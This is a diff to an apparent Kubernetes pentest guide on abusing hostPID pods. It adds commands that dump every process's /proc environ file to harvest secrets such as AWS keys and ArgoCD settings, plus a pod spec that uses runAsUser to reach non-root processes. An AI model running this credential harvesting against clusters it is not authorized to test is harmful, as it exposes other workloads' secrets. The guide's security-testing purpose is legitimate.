@@ -100,10 +100,12 @@ root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c 
 Check out that clear text password in the ps output below! 
 
 ## View the environment variables for each pod on the host
-This lists the environ file for each process, and then uses xargs to split it up so that each environment variable is on it's own line:
+This lists the environ file for each process, and then uses `xargs` to split it up so that each environment variable is on it's own line:
+
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt
 ```
+
 Now it's time to look for interesting environment variables. 
 ```bash
 root@hostpid-exec-pod:/# less envs.txt
@@ -121,6 +123,68 @@ AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 ...omitted for brevity...
 ```
 Oh look, an AWS IAM user key and secret! 
+
+**This only works on containers, not the host**
+
+As far as I know, there is no way to get the environment variables from the host processes. This only works for other containers. 
+
+**To get environment variables for processes owned by a non-root user, you need to do some extra work**
+
+The for loop shown above only grabs environment variables from processes running within pods that share same UID as your hostPID pod. By default, the badPods run as UID 0. Using our current `hostpid` pod, let's see what other pids are running:
+
+```bash
+root@hostpid-exec-pod:/# ps auxn | awk '{print $1}' | sort | uniq -c | sort -rn
+    205 0
+      9 999
+      8 1000
+      5 101
+      1 USER
+      1 104
+      1 103
+      1 102
+      1 1001
+      1 100
+      1 1
+```
+You can see that most processes on my cluster are running as root, but there are 9 PIDs running as UID 999. The only way I know to get the environment variables from those processes is to run a new pod with the runAsUser set to the desired UID. Here's an example:
+
+```bash
+ cat hostpid-exec-pod-999.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpid-exec-pod-999
+  labels:
+    app: pentest
+spec:
+  securityContext:
+    runAsUser: 999
+    runAsGroup: 999
+  hostPID: true
+  containers:
+  - name: hostpid-pod-999
+    image: ubuntu
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+```
+
+Now let's try it again from within our new pod running as UID/GID 999:
+
+```bash
+I have no name!@hostpid-exec-pod-999:/$ for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
+...omitted for brevity...
+/proc/988058/environ
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=argocd-server-69678b4f65-6mmql
+USER=argocd
+ARGOCD_METRICS_PORT=tcp://10.96.157.195:8082
+ARGOCD_REPO_SERVER_PORT=tcp://10.97.112.203:8081
+ARGOCD_REPO_SERVER_PORT_8084_TCP_PROTO=tcp
+ARGOCD_REPO_SERVER_PORT_8084_TCP_PORT=8084
+ARGOCD_SERVER_PORT_80_TCP_PORT=80
+```
+
+There we go! At some point I'll probably automate this so that I can spin up a new pod for each UID on the host. 
 
 ## View the file descriptors for each pod on the host
 This lists out the file descriptors for each PID that we have access to.
@@ -146,6 +210,10 @@ cat /proc/635813/fd/4
 3210#"! UtadBnnmAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLEAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYI'm going to keep my secrets in this file!
 ```
 More secrets!
+
+**To access the FDs for PIDs owned by a non-root user, you need to do some extra work**
+
+The note about permissions in the previous section applies here as well. To access the file descriptors associated with processes within containers that are not running as UID 0, you'll need to spin up additional pods - one pod per UID you see on the host.  
 
 
 ## Also, you can also kill any process, but don't do that in production :)
